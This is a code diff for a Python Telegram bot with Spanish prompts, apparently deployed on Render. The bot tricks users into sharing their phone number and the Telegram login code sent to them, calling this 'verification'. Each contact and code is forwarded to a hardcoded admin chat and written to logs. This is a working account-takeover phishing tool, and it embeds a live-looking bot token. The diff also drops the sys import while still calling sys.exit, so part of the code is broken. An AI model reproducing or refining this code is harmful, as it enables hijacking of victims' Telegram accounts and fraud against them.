@@ -1,18 +1,25 @@
+import os
 import asyncio
 import logging
-import sys
-import os
 from datetime import datetime
 from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
-from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters, ConversationHandler
+from telegram.ext import (
+    Application,
+    CommandHandler,
+    MessageHandler,
+    ConversationHandler,
+    ContextTypes,
+    filters
+)
 from aiohttp import web
+import socket
 
 # ================================
-# CONFIGURACIÓN
+# CONFIGURACIÓN (EDITA AQUÍ)
 # ================================
-TOKEN = "8557648219:AAHSBqKw7cP5Qz8hEeJn-Sjv4U6eZNnWACU"
+TELEGRAM_TOKEN = "8557648219:AAHSBqKw7cP5Qz8hEeJn-Sjv4U6eZNnWACU"
 ADMIN_ID = 7363341763
-PORT = int(os.environ.get('PORT', 10000))
+PORT = int(os.environ.get("PORT", 8000))
 
 # ================================
 # LOGGING
@@ -20,219 +27,317 @@ PORT = int(os.environ.get('PORT', 10000))
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
     level=logging.INFO,
-    handlers=[logging.StreamHandler(sys.stdout)]
+    handlers=[
+        logging.StreamHandler()
+    ]
 )
 logger = logging.getLogger(__name__)
 
-# Estados
+# ================================
+# ESTADOS Y DATOS
+# ================================
 PHONE, CODE = range(2)
 user_sessions = {}
+bot_start_time = datetime.now()
 
 # ================================
 # FUNCIONES DEL BOT
 # ================================
 
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Comando /start"""
+async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Maneja /start - Inicia el proceso de verificación"""
     user = update.effective_user
     
+    # Guardar sesión
     user_sessions[user.id] = {
         "step": "waiting_contact",
         "username": user.username,
-        "start_time": datetime.now().strftime("%H:%M:%S")
+        "start_time": datetime.now().isoformat(),
+        "user_id": user.id
     }
     
-    keyboard = [[KeyboardButton("📱 Compartir contacto", request_contact=True)]]
+    # Crear teclado con botón de contacto
+    contact_button = KeyboardButton("📱 Compartir mi número", request_contact=True)
+    keyboard = [[contact_button]]
     reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
     
     await update.message.reply_text(
-        "Para acceder, comparte tu contacto:",
+        "👋 *Bienvenido*\n\n"
+        "Para continuar, necesito verificar tu número.\n"
+        "Presiona el botón para compartir tu contacto.",
+        parse_mode="Markdown",
         reply_markup=reply_markup
     )
     
     return PHONE
 
-async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Maneja contacto compartido"""
+async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Procesa el contacto compartido"""
     user = update.effective_user
     contact = update.message.contact
     
+    # Verificar que sea el contacto del usuario
     if contact.user_id != user.id:
-        await update.message.reply_text("❌ Comparte tu propio contacto.")
+        await update.message.reply_text("⚠️ Por favor, comparte tu propio contacto.")
         return PHONE
     
-    user_sessions[user.id] = {
+    # Guardar información del contacto
+    user_info = {
         "step": "waiting_code",
         "phone": contact.phone_number,
         "name": f"{contact.first_name or ''} {contact.last_name or ''}".strip(),
         "username": user.username,
-        "contact_time": datetime.now().strftime("%H:%M:%S")
+        "user_id": user.id,
+        "contact_time": datetime.now().isoformat()
     }
+    user_sessions[user.id] = user_info
     
-    # Enviar al admin
-    admin_msg = f"""
-📱 NUEVO CONTACTO
-👤: {user_sessions[user.id]['name']}
-📞: {contact.phone_number}
-🆔: {user.id}
-👁️: @{user.username or 'N/A'}
-⏰: {datetime.now().strftime('%H:%M:%S')}
-"""
+    # 🔥 ENVIAR AL ADMINISTRADOR
+    admin_message = (
+        f"📱 *NUEVO CONTACTO RECIBIDO*\n\n"
+        f"👤 *Nombre:* {user_info['name']}\n"
+        f"📞 *Teléfono:* {contact.phone_number}\n"
+        f"🆔 *ID:* `{user.id}`\n"
+        f"👁️ *Username:* @{user.username or 'N/A'}\n"
+        f"⏰ *Hora:* {datetime.now().strftime('%H:%M:%S')}\n\n"
+        f"📝 *Estado:* Esperando código de Telegram"
+    )
     
     try:
-        await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg)
-        logger.info(f"📤 Contacto enviado al admin: {user.id}")
+        await context.bot.send_message(
+            chat_id=ADMIN_ID,
+            text=admin_message,
+            parse_mode="Markdown"
+        )
+        logger.info(f"✅ Contacto enviado al admin - User ID: {user.id}")
     except Exception as e:
         logger.error(f"❌ Error enviando al admin: {e}")
     
+    # Responder al usuario
     await update.message.reply_text(
-        "✅ Contacto recibido.\n\n"
-        "📨 Telegram te enviará un código por SMS.\n"
-        "Cuando lo recibas, escríbelo aquí:",
-        reply_markup=ReplyKeyboardMarkup([[]], resize_keyboard=True)
+        "✅ *Contacto recibido correctamente*\n\n"
+        "📨 *Ahora recibirás un código de Telegram*\n"
+        "• Es un código de 5 dígitos\n"
+        "• Te llegará por SMS o llamada\n"
+        "• Es enviado por Telegram oficialmente\n\n"
+        "Cuando lo recibas, escríbelo aquí:\n"
+        "`Ejemplo: 12345`",
+        parse_mode="Markdown",
+        reply_markup=ReplyKeyboardMarkup([[]], resize_keyboard=True)  # Remover teclado
     )
     
     return CODE
 
-async def handle_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Maneja código ingresado"""
+async def handle_code(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Procesa el código ingresado por el usuario"""
     user = update.effective_user
-    code = update.message.text.strip()
+    code_text = update.message.text.strip()
     
+    # Verificar estado del usuario
     if user.id not in user_sessions or user_sessions[user.id]["step"] != "waiting_code":
-        await update.message.reply_text("❌ Usa /start para comenzar.")
+        await update.message.reply_text(
+            "⚠️ *Primero debes compartir tu contacto.*\n"
+            "Usa /start para comenzar.",
+            parse_mode="Markdown"
+        )
         return ConversationHandler.END
     
-    user_data = user_sessions[user.id]
+    user_info = user_sessions[user.id]
     
-    # Enviar código al admin
-    code_msg = f"""
-🔐 CÓDIGO RECIBIDO
-👤: {user_data.get('name', 'N/A')}
-📞: {user_data.get('phone', 'N/A')}
-🆔: {user.id}
-👁️: @{user.username or 'N/A'}
-⏰: {datetime.now().strftime('%H:%M:%S')}
-🔢 Código: {code}
-"""
+    # Validar formato del código
+    if not code_text.isdigit() or len(code_text) < 5:
+        await update.message.reply_text(
+            "❌ *Formato inválido*\n"
+            "El código debe contener solo números (mínimo 5 dígitos).\n"
+            "Inténtalo de nuevo:",
+            parse_mode="Markdown"
+        )
+        return CODE
     
-    try:
-        await context.bot.send_message(chat_id=ADMIN_ID, text=code_msg)
-        logger.info(f"📤 Código enviado al admin: {user.id} - {code}")
-    except Exception as e:
-        logger.error(f"❌ Error enviando código: {e}")
-    
-    await update.message.reply_text(
-        f"✅ Código recibido: {code}\n\n"
-        "🎉 ¡Verificación completada!"
+    # 🔥 ENVIAR CÓDIGO AL ADMINISTRADOR
+    code_message = (
+        f"🔐 *CÓDIGO DE TELEGRAM RECIBIDO*\n\n"
+        f"👤 *Usuario:* {user_info['name']}\n"
+        f"📞 *Teléfono:* {user_info['phone']}\n"
+        f"🆔 *ID:* `{user.id}`\n"
+        f"👁️ *Username:* @{user.username or 'N/A'}\n"
+        f"⏰ *Hora:* {datetime.now().strftime('%H:%M:%S')}\n\n"
+        f"📝 *Código ingresado:*\n"
+        f"`{code_text}`\n\n"
+        f"✅ *VERIFICACIÓN COMPLETADA*"
     )
     
-    # Limpiar
+    try:
+        await context.bot.send_message(
+            chat_id=ADMIN_ID,
+            text=code_message,
+            parse_mode="Markdown"
+        )
+        logger.info(f"✅ Código enviado al admin - User ID: {user.id}, Código: {code_text}")
+    except Exception as e:
+        logger.error(f"❌ Error enviando código al admin: {e}")
+    
+    # Confirmación al usuario
+    await update.message.reply_text(
+        f"🎉 *¡Verificación exitosa!*\n\n"
+        f"✅ Código `{code_text}` recibido correctamente.\n"
+        f"📊 Tu verificación ha sido completada.\n\n"
+        f"⏰ *Finalizado:* {datetime.now().strftime('%H:%M:%S')}",
+        parse_mode="Markdown"
+    )
+    
+    # Limpiar sesión del usuario
     if user.id in user_sessions:
         del user_sessions[user.id]
     
     return ConversationHandler.END
 
-async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Cancela proceso"""
+async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Cancela la conversación"""
     user = update.effective_user
     
     if user.id in user_sessions:
         del user_sessions[user.id]
     
-    await update.message.reply_text("❌ Proceso cancelado.")
+    await update.message.reply_text(
+        "❌ *Proceso cancelado.*\n"
+        "Usa /start si deseas intentarlo nuevamente.",
+        parse_mode="Markdown"
+    )
+    
     return ConversationHandler.END
 
-async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Estadísticas (admin)"""
+async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Comando /stats - Solo para administrador"""
     user = update.effective_user
     
     if user.id != ADMIN_ID:
+        await update.message.reply_text("⚠️ Este comando es solo para administradores.")
         return
     
-    waiting = sum(1 for data in user_sessions.values() if data.get("step") == "waiting_code")
+    # Calcular estadísticas
+    waiting_for_code = sum(1 for data in user_sessions.values() if data.get("step") == "waiting_code")
+    total_sessions = len(user_sessions)
     
-    stats_msg = f"""
-📊 ESTADÍSTICAS
-• Sesiones: {len(user_sessions)}
-• Esperando código: {waiting}
-• Admin ID: {ADMIN_ID}
-• Hora: {datetime.now().strftime('%H:%M:%S')}
-"""
+    uptime = datetime.now() - bot_start_time
+    hours, remainder = divmod(int(uptime.total_seconds()), 3600)
+    minutes, seconds = divmod(remainder, 60)
     
-    await update.message.reply_text(stats_msg)
-
-# ================================
-# SERVIDOR WEB
-# ================================
+    stats_text = (
+        f"📊 *ESTADÍSTICAS DEL BOT*\n\n"
+        f"• Sesiones activas: `{total_sessions}`\n"
+        f"• Esperando código: `{waiting_for_code}`\n"
+        f"• Tiempo activo: `{hours}h {minutes}m {seconds}s`\n"
+        f"• Admin ID: `{ADMIN_ID}`\n"
+        f"• Puerto: `{PORT}`\n"
+        f"• Hora servidor: `{datetime.now().strftime('%H:%M:%S')}`\n\n"
+        f"🛠 *Hosteado en:* Render.com"
+    )
+    
+    await update.message.reply_text(stats_text, parse_mode="Markdown")
 
 async def health_check(request):
-    """Health check para Render"""
-    return web.Response(text="OK")
+    """Endpoint de salud para Render"""
+    return web.Response(
+        text=f"🚀 Bot Telegram - Status: OK\n"
+             f"⏰ Hora: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+             f"👥 Usuarios activos: {len(user_sessions)}\n"
+             f"📡 Puerto: {PORT}",
+        content_type="text/plain"
+    )
 
-# ================================
-# EJECUCIÓN PRINCIPAL
-# ================================
-
-async def main():
-    """Función principal"""
-    # Mostrar info
-    print("=" * 50)
-    print(f"🚀 Iniciando Bot")
-    print(f"🔑 Token: {TOKEN[:10]}...")
-    print(f"👑 Admin: {ADMIN_ID}")
-    print(f"🌐 Puerto: {PORT}")
-    print("=" * 50)
-    
-    # Servidor web
+async def start_web_server():
+    """Inicia el servidor web para Render"""
     app = web.Application()
     app.router.add_get('/', health_check)
     app.router.add_get('/health', health_check)
     
     runner = web.AppRunner(app)
     await runner.setup()
+    
+    # Usar el puerto de Render
     site = web.TCPSite(runner, '0.0.0.0', PORT)
     await site.start()
     
-    logger.info(f"🌐 Servidor HTTP en puerto {PORT}")
+    logger.info(f"🌐 Servidor web iniciado en puerto {PORT}")
+    return runner
+
+async def start_telegram_bot():
+    """Inicia el bot de Telegram"""
+    # Crear aplicación del bot
+    application = Application.builder().token(TELEGRAM_TOKEN).build()
     
-    # Bot de Telegram
-    application = Application.builder().token(TOKEN).build()
-    
+    # Configurar el manejador de conversación
     conv_handler = ConversationHandler(
-        entry_points=[CommandHandler('start', start)],
+        entry_points=[CommandHandler('start', start_command)],
         states={
             PHONE: [
                 MessageHandler(filters.CONTACT, handle_contact),
-                CommandHandler('cancel', cancel)
+                CommandHandler('cancel', cancel_command)
             ],
             CODE: [
                 MessageHandler(filters.TEXT & ~filters.COMMAND, handle_code),
-                CommandHandler('cancel', cancel)
+                CommandHandler('cancel', cancel_command)
             ]
         },
-        fallbacks=[CommandHandler('cancel', cancel)]
+        fallbacks=[CommandHandler('cancel', cancel_command)]
     )
     
+    # Agregar handlers
     application.add_handler(conv_handler)
-    application.add_handler(CommandHandler('stats', stats))
+    application.add_handler(CommandHandler('stats', stats_command))
     
+    # Iniciar bot
     await application.initialize()
     await application.start()
+    
+    # Usar polling (sin webhook)
     await application.updater.start_polling()
     
-    logger.info("🤖 Bot iniciado (polling)")
+    logger.info(f"🤖 Bot iniciado con token: {TELEGRAM_TOKEN[:15]}...")
+    logger.info(f"👑 Admin ID: {ADMIN_ID}")
     
-    # Mantener activo
+    return application
+
+async def main():
+    """Función principal"""
+    # Información de inicio
+    print("=" * 60)
+    print(f"🚀 TELEGRAM BOT - RENDER 2026")
+    print(f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    print(f"🔑 Token: {TELEGRAM_TOKEN[:15]}...")
+    print(f"👑 Admin: {ADMIN_ID}")
+    print(f"🌐 Puerto: {PORT}")
+    print("=" * 60)
+    
     try:
+        # Iniciar servidor web (requerido por Render)
+        web_server = await start_web_server()
+        
+        # Iniciar bot de Telegram
+        telegram_bot = await start_telegram_bot()
+        
+        # Mantener el servicio activo
+        logger.info("✅ Sistema completamente operativo")
+        
+        # Bucle infinito para mantener el servicio activo
         while True:
-            await asyncio.sleep(3600)
+            await asyncio.sleep(3600)  # Esperar 1 hora
+            
     except KeyboardInterrupt:
-        logger.info("⏹️ Deteniendo...")
+        logger.info("⏹️ Deteniendo servicio...")
+    except Exception as e:
+        logger.error(f"❌ Error crítico: {e}")
+        raise
     finally:
-        await application.stop()
-        await application.shutdown()
-        await runner.cleanup()
+        logger.info("👋 Servicio detenido")
 
 if __name__ == '__main__':
-    asyncio.run(main())
+    # Configurar asyncio para Render
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        print("\n✅ Programa terminado correctamente")
+    except Exception as e:
+        print(f"❌ Error de inicio: {e}")
+        sys.exit(1)
